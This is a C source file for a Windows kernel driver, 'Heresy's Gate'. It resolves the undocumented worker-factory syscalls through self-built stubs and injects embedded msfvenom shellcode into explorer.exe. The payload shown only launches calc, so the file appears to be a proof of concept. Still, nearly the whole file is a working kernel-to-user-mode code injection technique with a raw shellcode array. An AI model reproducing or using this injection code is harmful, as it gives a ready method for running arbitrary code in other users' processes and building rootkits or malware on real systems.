#include <ntddk.h>
#include <intrin.h>

#include "inject.h"
#include "scrape.h"

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD HeresyUnload;

#ifdef ALLOC_PRAGMA
#pragma alloc_text( INIT, DriverEntry )
#pragma alloc_text( PAGE, HeresyUnload )
#endif

#define HERESY_POOL_TAG 'HRSY'

// spawning a calc in lsass.exe session 0 sux
static PCHAR PROCESS_TO_FIND = "explorer.exe";

/*
$ ./msfvenom -a x64 --platform windows -p windows/x64/exec EXITFUNC=thread CMD=calc -f c
No encoder or badchars specified, outputting raw payload
Payload size: 272 bytes
Final size of c file: 1169 bytes
*/
unsigned char USER_MODE_PAYLOAD[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x00";

NTSTATUS NTAPI DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	// __debugbreak();

	NTSTATUS Status = STATUS_DRIVER_INTERNAL_ERROR;

	INJECT_WORK_FACTORY_FUNCTIONS Functions = { 0 };

	// boring, always exported routines
	UNICODE_STRING ZwCreateIoCompletionName = RTL_CONSTANT_STRING(L"ZwCreateIoCompletion");
	UNICODE_STRING PsGetProcessImageFileNameName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");

	Functions.__ZwCreateIoCompletion = (ZW_CREATE_IO_COMPLETION)
		MmGetSystemRoutineAddress(&ZwCreateIoCompletionName);

	Functions.__PsGetProcessImageFileName = (PS_GET_PROCESS_IMAGE_FILE_NAME)
		MmGetSystemRoutineAddress(&PsGetProcessImageFileNameName);
		
	// --------------------------
	// Heresy's Gate
	// --------------------------
	Functions.__ZwCreateWorkerFactory = (ZW_CREATE_WORKER_FACTORY)
		MakeHeresyZwStubFromNtdllExport((PUCHAR)&ZwReadFile, "NtCreateWorkerFactory", HERESY_POOL_TAG);

	Functions.__ZwSetInformationWorkerFactory = (ZW_SET_INFORMATION_WORKER_FACTORY)
		MakeHeresyZwStubFromNtdllExport((PUCHAR)&ZwReadFile, "NtSetInformationWorkerFactory", HERESY_POOL_TAG);

	if (Functions.__ZwCreateWorkerFactory != NULL &&
		Functions.__ZwSetInformationWorkerFactory != NULL &&
		Functions.__ZwCreateIoCompletion != NULL &&
		Functions.__PsGetProcessImageFileName != NULL)
	{

		// --------------------------
		// Work Out
		// --------------------------
		Status = InjectWorkFactory(
			PROCESS_TO_FIND,
			USER_MODE_PAYLOAD,
			sizeof(USER_MODE_PAYLOAD),
			HERESY_POOL_TAG,
			&Functions
		);
	}
	
	if (Functions.__ZwSetInformationWorkerFactory)
	{
		ExFreePoolWithTag((PVOID)Functions.__ZwSetInformationWorkerFactory, HERESY_POOL_TAG);
	}
	
	if (Functions.__ZwCreateWorkerFactory)
	{
		ExFreePoolWithTag((PVOID)Functions.__ZwCreateWorkerFactory, HERESY_POOL_TAG);
	}

	DriverObject->DriverUnload = HeresyUnload;

	return Status;
}

VOID HeresyUnload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
}